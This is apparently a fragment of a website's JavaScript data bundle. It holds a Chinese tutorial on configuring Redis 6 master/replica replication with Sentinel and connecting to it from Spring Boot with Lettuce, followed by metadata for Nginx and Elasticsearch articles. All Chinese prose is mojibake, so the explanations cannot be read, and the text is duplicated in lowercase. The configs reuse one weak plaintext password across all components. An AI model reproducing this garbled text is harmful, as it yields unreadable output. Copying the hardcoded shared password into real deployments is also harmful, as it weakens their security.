ä¹å¾æ¯ä¸ä¸ªä»¥ä¸ã\n\nIP               PORT    é¨ç½²\n192.168.81.101   6379    Redis6 master\n192.168.81.101   26379   Redis6 Sentinel\n192.168.81.102   6379    Redis6 slave\n192.168.81.102   26379   Redis6 Sentinel\n\n\n\n\n# ä¸»ä»æ­å»º\n\nä¸ºäºä¸»ä» Redis å®å¨ï¼å¯ç æ¯å¿é¡»è®¾ç½®çï¼å¦åç­çè¢«æç¿å§ãå¨éç½®æä»¶ä¿®æ¹å¦ä¸ï¼\nä¸»ä»å¯ç å¯ä»¥ä¸æ ·ï¼æ¹ä¾¿è®°å¿ã\n\nrequirepass ilovejj\n\n\n1\n\n\nè®¾ç½®è¿æ¥ master æ¶çè®¤è¯å¯ç ï¼ä¸æ¬ç» slave çéç½®æä»¶è®¾ç½®\n\nmasterauth ilovejj\n\n\n1\n\n\né½å¯å¨æåä¹åå¨ slave ä½¿ç¨ä»¥ä¸å½ä»¤\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nOK\n\n\n1\n2\n\n\nå¯ä»¥ä»æ¥å¿éé¢çå°æ¯å¦å¯å¨æåï¼å¦ææ²¡æå¯å¨æååä¼ä¸ç´æå°å¦ä¸ï¼æè¿éææå¼ä¸ä¸ªéè¯¯ç IP å ä»¥è¯´æã\n\n2187:S 16 Nov 2020 17:19:17.913 # Error condition on socket for SYNC: Operation now in progress\n2187:S 16 Nov 2020 17:19:18.526 * Connecting to MASTER 192.168.81.111:6379\n2187:S 16 Nov 2020 17:19:18.526 * MASTER <-> REPLICA sync started\n\n\n1\n2\n3\n\n\n> ä¸å®è¦è®°å¾å æ¥å¿ï¼å¦åä»¥åæä¹æ­»çé½ä¸ç¥éã\n\n\n# å¨åµ\n\nå¨ Redis ç®å½ä¸ï¼èªå¸¦çä¸ä¸ª sentinel.cnf æä»¶ï¼æçç¸å³ sentinel éç½®ï¼æä»¬ä¿®æ¹å¦ä¸ï¼\n\n# ç«¯å£é»è®¤\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> åè®°å¨åµï¼ä¸å®è¦ç¨çæ¯ master ç IPï¼åªæå¨åä¸å°æå¡å¨ä¸ï¼ä¹è¦ä½¿ç¨ IPï¼ä¸è¦ä½¿ç¨ 127.0.0.1ï¼å¦åææä¸å°å¨åµï¼salve å¯è½æ æ³å¤å¶ã\n\n * daemonize yes é»è®¤ no\n   é»è®¤æ¯ noï¼æ¹ä¸º yes è®©å¨åå°è¿è¡\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   é»è®¤ä¸è¾åºæ¥å¿ï¼ä¸å®è¦éç½®æ¥å¿ï¼å¦å...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   çè§ä¸ä¸ªåä¸º mymaster çä¸»æå¡å¨ï¼ è¿ä¸ªä¸»æå¡å¨ç IP å°åä¸º 192.168.81.101 ï¼ ç«¯å£å·ä¸º 6379 ï¼ èå°è¿ä¸ªä¸»æå¡å¨å¤æ­ä¸ºå¤±æè³å°éè¦ 2 ä¸ª Sentinel åæãè¿éç mymaster åªæ¯ä¸ä¸ªå¿åï¼ä¾ä»¥ä¸éç½®ä½¿ç¨ã\n\n * sentinel down-after-milliseconds mymaster 60000 é»è®¤ 30000ms\n   å¦ææå¡å¨å¨ç»å®çæ¯«ç§æ°ä¹åï¼ æ²¡æè¿å Sentinel åéç PING å½ä»¤çåå¤ï¼ æèè¿åä¸ä¸ªéè¯¯ï¼ é£ä¹ Sentinel å°è¿ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ï¼subjectively downï¼ç®ç§° SDOWN ï¼ã\n   ä¸è¿åªæä¸ä¸ª Sentinel å°æå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿å¹¶ä¸ä¸å®ä¼å¼èµ·æå¡å¨çèªå¨æéè¿ç§»ï¼ åªæå¨è¶³å¤æ°éç Sentinel é½å°ä¸ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ä¹åï¼ æå¡å¨æä¼è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ï¼objectively downï¼ ç®ç§° ODOWN ï¼ï¼ è¿æ¶èªå¨æéè¿ç§»æä¼æ§è¡ã\n   å°æå¡å¨æ è®°ä¸ºå®¢è§ä¸çº¿æéç Sentinel æ°éç±å¯¹ä¸»æå¡å¨çéç½®å³å®ã\n\n * sentinel failover-timeout mymaster 180000 é»è®¤ 180000ms\n   æéè½¬ç§»æ¶é´\n\n * sentinel parallel-syncs mymaster 1 é»è®¤ 1\n   å¨æ§è¡æéè½¬ç§»æ¶ï¼ æå¤å¯ä»¥æå¤å°ä¸ªä»æå¡å¨åæ¶å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ è¿ä¸ªæ°å­è¶å°ï¼ å®ææéè½¬ç§»æéçæ¶é´å°±è¶é¿ã\n   å¦æä»æå¡å¨è¢«è®¾ç½®ä¸ºåè®¸ä½¿ç¨è¿ææ°æ®éï¼åè§å¯¹ redis.conf æä»¶ä¸­å¯¹ slave-serve-stale-data éé¡¹çè¯´æï¼ï¼ é£ä¹ä½ å¯è½ä¸å¸æææä»æå¡å¨é½å¨åä¸æ¶é´åæ°çä¸»æå¡å¨åéåæ­¥è¯·æ±ï¼ å ä¸ºå°½ç®¡å¤å¶è¿ç¨çç»å¤§é¨åæ­¥éª¤é½ä¸ä¼é»å¡ä»æå¡å¨ï¼ ä½ä»æå¡å¨å¨è½½å¥ä¸»æå¡å¨åæ¥ç RDB æä»¶æ¶ï¼ ä»ç¶ä¼é æä»æå¡å¨å¨ä¸æ®µæ¶é´åä¸è½å¤çå½ä»¤è¯·æ±ï¼ å¦æå¨é¨ä»æå¡å¨ä¸èµ·å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ é£ä¹å°±å¯è½ä¼é æææä»æå¡å¨å¨ç­æ¶é´åå¨é¨ä¸å¯ç¨çæåµåºç°ã\n   ä½ å¯ä»¥éè¿å°è¿ä¸ªå¼è®¾ä¸º 1 æ¥ä¿è¯æ¯æ¬¡åªæä¸ä¸ªä»æå¡å¨å¤äºä¸è½å¤çå½ä»¤è¯·æ±çç¶æã\n\n * sentinel auth-pass mymaster ilovejj\n   éç½®å¯ç \n\n\n# å¨åµå¯å¨\n\næè¿éå¨åµå redis å®ä¾æ¯åä¸å°ï¼ææå°±æ¯å¯ä»¥ä¸èµ·ä½¿ç¨ï¼ä¸éè¦å¨é¨ç½²ä¸ä¸ªå¨åµã\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\nå¯å¨åè®°å¾æ¥çæ¥å¿ï¼ä¸äºä¸ä¸ºäººç¥çéç½®éè¯¯é½ä¼å¨æ¥å¿éé¢æ¾ç¤ºãå¶ä¸­ä¼æä¸å°ä¸ç´è¾åºåå¶ä»å¨åµè¿æ¥çä¿¡æ¯ã\n\n\n# spring boot redis å¨åµ\n\nmavenï¼åªæ¾å³äº Redis ç\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n        </dependency>\n        \n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\néç½®æä»¶\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # è¿æ¯ææ¡æ¶èªå·±å¾ä¸ä¸ªå±æ§å¤§å®¶å¿½ç¥\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.RedisSentinelConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceClientConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.connection.lettuce.LettucePoolingClientConfiguration;\n\nimport java.util.HashSet;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@Configuration\n@Slf4j\n@ConditionalOnExpression("${spring.redis.sentinel.enable:false}")\npublic class RedisSentinelConfig {\n\n\n    @Autowired\n    RedisProperties redisProperties;\n\n    /**\n     * GenericObjectPoolConfig è¿æ¥æ± éç½®\n     */\n    @Bean\n    public GenericObjectPoolConfig genericObjectPoolConfig() {\n        GenericObjectPoolConfig genericObjectPoolConfig = new GenericObjectPoolConfig();\n        genericObjectPoolConfig.setMaxIdle(redisProperties.getLettuce().getPool().getMaxIdle());\n        genericObjectPoolConfig.setMinIdle(redisProperties.getLettuce().getPool().getMinIdle());\n        genericObjectPoolConfig.setMaxTotal(redisProperties.getLettuce().getPool().getMaxActive());\n        genericObjectPoolConfig.setMaxWaitMillis(redisProperties.getLettuce().getPool().getMaxWait().toMillis());\n        return genericObjectPoolConfig;\n    }\n\n    /**\n     * å¨åµ\n    **/\n    @Bean\n    public LettuceConnectionFactory redisConnectionFactory(GenericObjectPoolConfig genericObjectPoolConfig) {\n        RedisSentinelConfiguration redisSentinelConfiguration = new RedisSentinelConfiguration(redisProperties.getSentinel().getMaster(),\n                new HashSet<>(redisProperties.getSentinel().getNodes()));\n        redisSentinelConfiguration.setPassword(redisProperties.getSentinel().getPassword());\n        // éç½®æ± \n        LettuceClientConfiguration clientConfig = LettucePoolingClientConfiguration.builder()\n                .commandTimeout(redisProperties.getTimeout())\n                .poolConfig(genericObjectPoolConfig)\n                .build();\n        LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(redisSentinelConfiguration,clientConfig);\n        log.debug("redis å¨åµå¯å¨");\n        return lettuceConnectionFactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',normalizedContent:'# ç¯å¢\n\nèèå°æ¢ç¶æ¯é«å¯ç¨ï¼é£ä¹ sentinel ä¹å¾æ¯ä¸ä¸ªä»¥ä¸ã\n\nip               port    é¨ç½²\n192.168.81.101   6379    redis6 master\n192.168.81.101   26379   redis6 sentinel\n192.168.81.102   6379    redis6 slave\n192.168.81.102   26379   redis6 sentinel\n\n\n\n\n# ä¸»ä»æ­å»º\n\nä¸ºäºä¸»ä» redis å®å¨ï¼å¯ç æ¯å¿é¡»è®¾ç½®çï¼å¦åç­çè¢«æç¿å§ãå¨éç½®æä»¶ä¿®æ¹å¦ä¸ï¼\nä¸»ä»å¯ç å¯ä»¥ä¸æ ·ï¼æ¹ä¾¿è®°å¿ã\n\nrequirepass ilovejj\n\n\n1\n\n\nè®¾ç½®è¿æ¥ master æ¶çè®¤è¯å¯ç ï¼ä¸æ¬ç» slave çéç½®æä»¶è®¾ç½®\n\nmasterauth ilovejj\n\n\n1\n\n\né½å¯å¨æåä¹åå¨ slave ä½¿ç¨ä»¥ä¸å½ä»¤\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nok\n\n\n1\n2\n\n\nå¯ä»¥ä»æ¥å¿éé¢çå°æ¯å¦å¯å¨æåï¼å¦ææ²¡æå¯å¨æååä¼ä¸ç´æå°å¦ä¸ï¼æè¿éææå¼ä¸ä¸ªéè¯¯ç ip å ä»¥è¯´æã\n\n2187:s 16 nov 2020 17:19:17.913 # error condition on socket for sync: operation now in progress\n2187:s 16 nov 2020 17:19:18.526 * connecting to master 192.168.81.111:6379\n2187:s 16 nov 2020 17:19:18.526 * master <-> replica sync started\n\n\n1\n2\n3\n\n\n> ä¸å®è¦è®°å¾å æ¥å¿ï¼å¦åä»¥åæä¹æ­»çé½ä¸ç¥éã\n\n\n# å¨åµ\n\nå¨ redis ç®å½ä¸ï¼èªå¸¦çä¸ä¸ª sentinel.cnf æä»¶ï¼æçç¸å³ sentinel éç½®ï¼æä»¬ä¿®æ¹å¦ä¸ï¼\n\n# ç«¯å£é»è®¤\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> åè®°å¨åµï¼ä¸å®è¦ç¨çæ¯ master ç ipï¼åªæå¨åä¸å°æå¡å¨ä¸ï¼ä¹è¦ä½¿ç¨ ipï¼ä¸è¦ä½¿ç¨ 127.0.0.1ï¼å¦åææä¸å°å¨åµï¼salve å¯è½æ æ³å¤å¶ã\n\n * daemonize yes é»è®¤ no\n   é»è®¤æ¯ noï¼æ¹ä¸º yes è®©å¨åå°è¿è¡\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   é»è®¤ä¸è¾åºæ¥å¿ï¼ä¸å®è¦éç½®æ¥å¿ï¼å¦å...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   çè§ä¸ä¸ªåä¸º mymaster çä¸»æå¡å¨ï¼ è¿ä¸ªä¸»æå¡å¨ç ip å°åä¸º 192.168.81.101 ï¼ ç«¯å£å·ä¸º 6379 ï¼ èå°è¿ä¸ªä¸»æå¡å¨å¤æ­ä¸ºå¤±æè³å°éè¦ 2 ä¸ª sentinel åæãè¿éç mymaster åªæ¯ä¸ä¸ªå¿åï¼ä¾ä»¥ä¸éç½®ä½¿ç¨ã\n\n * sentinel down-after-milliseconds mymaster 60000 é»è®¤ 30000ms\n   å¦ææå¡å¨å¨ç»å®çæ¯«ç§æ°ä¹åï¼ æ²¡æè¿å sentinel åéç ping å½ä»¤çåå¤ï¼ æèè¿åä¸ä¸ªéè¯¯ï¼ é£ä¹ sentinel å°è¿ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ï¼subjectively downï¼ç®ç§° sdown ï¼ã\n   ä¸è¿åªæä¸ä¸ª sentinel å°æå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿å¹¶ä¸ä¸å®ä¼å¼èµ·æå¡å¨çèªå¨æéè¿ç§»ï¼ åªæå¨è¶³å¤æ°éç sentinel é½å°ä¸ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ä¹åï¼ æå¡å¨æä¼è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ï¼objectively downï¼ ç®ç§° odown ï¼ï¼ è¿æ¶èªå¨æéè¿ç§»æä¼æ§è¡ã\n   å°æå¡å¨æ è®°ä¸ºå®¢è§ä¸çº¿æéç sentinel æ°éç±å¯¹ä¸»æå¡å¨çéç½®å³å®ã\n\n * sentinel failover-timeout mymaster 180000 é»è®¤ 180000ms\n   æéè½¬ç§»æ¶é´\n\n * sentinel parallel-syncs mymaster 1 é»è®¤ 1\n   å¨æ§è¡æéè½¬ç§»æ¶ï¼ æå¤å¯ä»¥æå¤å°ä¸ªä»æå¡å¨åæ¶å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ è¿ä¸ªæ°å­è¶å°ï¼ å®ææéè½¬ç§»æéçæ¶é´å°±è¶é¿ã\n   å¦æä»æå¡å¨è¢«è®¾ç½®ä¸ºåè®¸ä½¿ç¨è¿ææ°æ®éï¼åè§å¯¹ redis.conf æä»¶ä¸­å¯¹ slave-serve-stale-data éé¡¹çè¯´æï¼ï¼ é£ä¹ä½ å¯è½ä¸å¸æææä»æå¡å¨é½å¨åä¸æ¶é´åæ°çä¸»æå¡å¨åéåæ­¥è¯·æ±ï¼ å ä¸ºå°½ç®¡å¤å¶è¿ç¨çç»å¤§é¨åæ­¥éª¤é½ä¸ä¼é»å¡ä»æå¡å¨ï¼ ä½ä»æå¡å¨å¨è½½å¥ä¸»æå¡å¨åæ¥ç rdb æä»¶æ¶ï¼ ä»ç¶ä¼é æä»æå¡å¨å¨ä¸æ®µæ¶é´åä¸è½å¤çå½ä»¤è¯·æ±ï¼ å¦æå¨é¨ä»æå¡å¨ä¸èµ·å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ é£ä¹å°±å¯è½ä¼é æææä»æå¡å¨å¨ç­æ¶é´åå¨é¨ä¸å¯ç¨çæåµåºç°ã\n   ä½ å¯ä»¥éè¿å°è¿ä¸ªå¼è®¾ä¸º 1 æ¥ä¿è¯æ¯æ¬¡åªæä¸ä¸ªä»æå¡å¨å¤äºä¸è½å¤çå½ä»¤è¯·æ±çç¶æã\n\n * sentinel auth-pass mymaster ilovejj\n   éç½®å¯ç \n\n\n# å¨åµå¯å¨\n\næè¿éå¨åµå redis å®ä¾æ¯åä¸å°ï¼ææå°±æ¯å¯ä»¥ä¸èµ·ä½¿ç¨ï¼ä¸éè¦å¨é¨ç½²ä¸ä¸ªå¨åµã\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\nå¯å¨åè®°å¾æ¥çæ¥å¿ï¼ä¸äºä¸ä¸ºäººç¥çéç½®éè¯¯é½ä¼å¨æ¥å¿éé¢æ¾ç¤ºãå¶ä¸­ä¼æä¸å°ä¸ç´è¾åºåå¶ä»å¨åµè¿æ¥çä¿¡æ¯ã\n\n\n# spring boot redis å¨åµ\n\nmavenï¼åªæ¾å³äº redis ç\n\n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-data-redis</artifactid>\n        </dependency>\n        \n        <dependency>\n            <groupid>org.apache.commons</groupid>\n            <artifactid>commons-pool2</artifactid>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\néç½®æä»¶\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # è¿æ¯ææ¡æ¶èªå·±å¾ä¸ä¸ªå±æ§å¤§å®¶å¿½ç¥\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.pool2.impl.genericobjectpoolconfig;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.condition.conditionalonexpression;\nimport org.springframework.boot.autoconfigure.data.redis.redisproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.redissentinelconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceclientconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceconnectionfactory;\nimport org.springframework.data.redis.connection.lettuce.lettucepoolingclientconfiguration;\n\nimport java.util.hashset;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@configuration\n@slf4j\n@conditionalonexpression("${spring.redis.sentinel.enable:false}")\npublic class redissentinelconfig {\n\n\n    @autowired\n    redisproperties redisproperties;\n\n    /**\n     * genericobjectpoolconfig è¿æ¥æ± éç½®\n     */\n    @bean\n    public genericobjectpoolconfig genericobjectpoolconfig() {\n        genericobjectpoolconfig genericobjectpoolconfig = new genericobjectpoolconfig();\n        genericobjectpoolconfig.setmaxidle(redisproperties.getlettuce().getpool().getmaxidle());\n        genericobjectpoolconfig.setminidle(redisproperties.getlettuce().getpool().getminidle());\n        genericobjectpoolconfig.setmaxtotal(redisproperties.getlettuce().getpool().getmaxactive());\n        genericobjectpoolconfig.setmaxwaitmillis(redisproperties.getlettuce().getpool().getmaxwait().tomillis());\n        return genericobjectpoolconfig;\n    }\n\n    /**\n     * å¨åµ\n    **/\n    @bean\n    public lettuceconnectionfactory redisconnectionfactory(genericobjectpoolconfig genericobjectpoolconfig) {\n        redissentinelconfiguration redissentinelconfiguration = new redissentinelconfiguration(redisproperties.getsentinel().getmaster(),\n                new hashset<>(redisproperties.getsentinel().getnodes()));\n        redissentinelconfiguration.setpassword(redisproperties.getsentinel().getpassword());\n        // éç½®æ± \n        lettuceclientconfiguration clientconfig = lettucepoolingclientconfiguration.builder()\n                .commandtimeout(redisproperties.gettimeout())\n                .poolconfig(genericobjectpoolconfig)\n                .build();\n        lettuceconnectionfactory lettuceconnectionfactory = new lettuceconnectionfactory(redissentinelconfiguration,clientconfig);\n        log.debug("redis å¨åµå¯å¨");\n        return lettuceconnectionfactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',charsets:{cjk:!0}},{title:"Nginx åºæ¬æ¦å¿µåä»ç»",frontmatter:{title:"Nginx åºæ¬æ¦å¿µåä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/nginx/1",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/04.nginx/1700.Nginx%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/04.nginx/1700.Nginx åºæ¬æ¦å¿µåä»ç».md",key:"v-44194b63",path:"/nginx/1/",headers:[{level:2,title:"æ¦å¿µ",slug:"æ¦å¿µ",normalizedTitle:"æ¦å¿µ",charIndex:2}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¦å¿µ",content:"# æ¦å¿µ",normalizedContent:"# æ¦å¿µ",charsets:{cjk:!0}},{title:"ES 7.8.0ï¼ä¸ï¼ å¥é¨ä»ç»",frontmatter:{title:"ES 7.8.0ï¼ä¸ï¼ å¥é¨ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1800",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1800.ES%207.8.0%EF%BC%88%E4%B8%80%EF%BC%89%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/05.Elasticsearch/1800.ES 7.8.0ï¼ä¸ï¼ å¥é¨ä»ç».md",key:"v-5b4e4ae2",path:"/es/1800/",headers:[{level:2,title:"åºç¡æ¦å¿µ",slug:"åºç¡æ¦å¿µ",normalizedTitle:"åºç¡æ¦å¿µ",charIndex:2},{level:2,title:"åæºå®è£",slug:"åæºå®è£",normalizedTitle:"åæºå®è£",charIndex:531},{level:2,title:"æ°æ®æ ¼å¼ç®ä»",slug:"æ°æ®æ ¼å¼ç®ä»",normalizedTitle:"æ°æ®æ ¼å¼ç®ä»",charIndex:2577},{level:2,title:"åºæ¬æä½",slug:"åºæ¬æä½",normalizedTitle:"åºæ¬æä½",charIndex:3434},{level:3,title:"ç´¢å¼",slug:"ç´¢å¼",normalizedTitle:"ç´¢å¼",charIndex:11},{level:4,title:"åå»ºç´¢å¼",slug:"åå»ºç´¢å¼",normalizedTitle:"åå»ºç´¢å¼",charIndex:3449},{level:4,title:"æ¥çç´¢å¼",slug:"æ¥çç´¢å¼",normalizedTitle:"æ¥çç´¢å¼",charIndex:3531},{level:4,title:"å é¤ç´¢å¼",slug:"å é¤ç´¢å¼",normalizedTitle:"å é¤ç´¢å¼",charIndex:3713},{level:3,title:"ææ¡£æä½",slug:"ææ¡£æä½",normalizedTitle:"ææ¡£æä½",charIndex:3799},{level:4,title:"åå»ºææ¡£",slug:"åå»ºææ¡£",normalizedTitle:"åå»ºææ¡£",charIndex:3807},{level:4,title:"æ¥è¯¢ææ¡£",slug:"æ¥è¯¢ææ¡£",normalizedTitle:"æ¥è¯¢ææ¡£",charIndex:5112},{level:4,title:"ä¿®æ¹ææ¡£",slug:"ä¿®æ¹ææ¡£",normalizedTitle:"ä¿®æ¹ææ¡£",charIndex:5325},{level:3,title:"æ¡ä»¶æ¥è¯¢",slug:"æ¡ä»¶æ¥è¯¢",normalizedTitle:"æ¡ä»¶æ¥è¯¢",charIndex:6240},{level:3,title:"å¨ææ£ç´¢&å®å¨å¹é&é«äº®æ¥è¯¢&èåæ¥è¯¢",slug:"å¨ææ£ç´¢-å®å¨å¹é-é«äº®æ¥è¯¢-èåæ¥è¯¢",normalizedTitle:"å¨ææ£ç´¢ &amp; å®å¨å¹é &amp; é«äº®æ¥è¯¢ &amp; èåæ¥è¯¢",charIndex:null},{level:3,title:"æ å°å³ç³»",slug:"æ å°å³ç³»",normalizedTitle:"æ å°å³ç³»",charIndex:9821},{level:3,title:"åçåå¯æ¬",slug:"åçåå¯æ¬",normalizedTitle:"åçåå¯æ¬",charIndex:11809},{level:2,title:"éç¾¤æ­å»º",slug:"éç¾¤æ­å»º",normalizedTitle:"éç¾¤æ­å»º",charIndex:12901}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åºç¡æ¦å¿µ åæºå®è£ æ°æ®æ ¼å¼ç®ä» åºæ¬æä½ ç´¢å¼ åå»ºç´¢å¼ æ¥çç´¢å¼ å é¤ç´¢å¼ ææ¡£æä½ åå»ºææ¡£ æ¥è¯¢ææ¡£ ä¿®æ¹ææ¡£ æ¡ä»¶æ¥è¯¢ å¨ææ£ç´¢&å®å¨å¹é&é«äº®æ¥è¯¢&èåæ¥è¯¢ æ å°å³ç³» åçåå¯æ¬ éç¾¤æ­å»º",content:'# åºç¡æ¦å¿µ\n\n * ç´¢å¼ï¼indexï¼\n   ES çç´¢å¼ç±»ä¼¼äº MySQL çåº\n * ç±»åï¼typeï¼\n   å¨ä¸ä¸ªç´¢å¼ä¸­å¯ä»¥æä¸ä¸ªæå¤ä¸ªç±»åï¼éå¸¸ä¼ä¸ºç¸åææ¡£æ ¼å¼çå½ä¸ºä¸ä¸ªç±»åï¼ä½å¨ ES7.x é»è®¤ä¸å¨æ¯æç´¢å¼ç±»åçæä½ï¼ææ¡£åç´¢å¼ç´æ¥äº§çå³ç³»ã\n * ææ¡£ï¼docï¼\n   ææ¡£å°±æ¯æä»¬ç JSON æ°æ®ï¼ä¸ä¸ªç´¢å¼æå¤ä¸ªææ¡£\n * å­æ®µï¼fieldï¼\n   å°±æ¯ææ¡£ JSON ä¸­çå±æ§\n * æ å°ï¼mappingï¼\n   MySQL è¡¨ä¸­ä¼æç¸å³çå­æ®µç±»åï¼æ¯å¦ä¸ºç©ºï¼é¿åº¦å¤å°ï¼æ¯å¦ç´¢å¼ï¼è¿äºå ES ä¸­ç Mapping ç¸ä¼¼ï¼å¯ä»¥å®ä¹ä¸ä¸ªå±æ§ï¼ä»¥åä»çç±»åï¼æ¯å¦å¯ä»¥è¢«ç´¢å¼ç­ã\n * åçï¼Shardsï¼\n   ES çåçç¸å½äº MySQL çæ°´å¹³åè¡¨ï¼æ¯å¦ id % 5ï¼ä¸åç»æè½å°åä¸ªè¢«å®ä¹å¥½çè¡¨ä¸­ï¼å¯ä»¥æ©å±æä»¬çå­å¨å®¹éï¼æææé«æ¥è¯¢æ§è½\n * å¯æ¬ï¼replicasï¼\n   åçå¯ä»¥ææ°æ®åå¸å°åä¸ªèç¹ä¸ï¼ç»ä¸æé«æå¡ï¼å¯æä¸ªèç¹å´©æºå°±ä¼å¯¼è´æ°æ®çä¸¢å¤±ï¼å¯æ¬å°±æ¯ä¿è¯åççæ°æ®é«å¯ç¨çä¸ç§æ¹æ¡ï¼ææ°æ®å¨å¦ä¸å°æå¡å¨å¤å¶ä¸ä»½ãå¯æ¬ä¹å¯ä»¥æåä¸å®çæ§è½ï¼å ä¸ºæç´¢å¯ä»¥å¨ææçå¯æ¬ä¸å¹¶è¿è¡ã\n * åéï¼Allocationï¼\n\n\n# åæºå®è£\n\nå®ç½å°åï¼https://www.elastic.co/cn/downloads/past-releases#elasticsearchï¼éè¦ç¨ä¸äºç§å­¦ææ®µï¼å¦ååå®¹å è½½ä¸å¨ï¼ä¸å¥½æ¾å°æä¹ä½ éè¦ççã\n\n# ä¸è½½\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-linux-x86_64.tar.gz\n# è§£å\ntar -xvf elasticsearch-7.8.0-linux-x86_64.tar.gz\n# 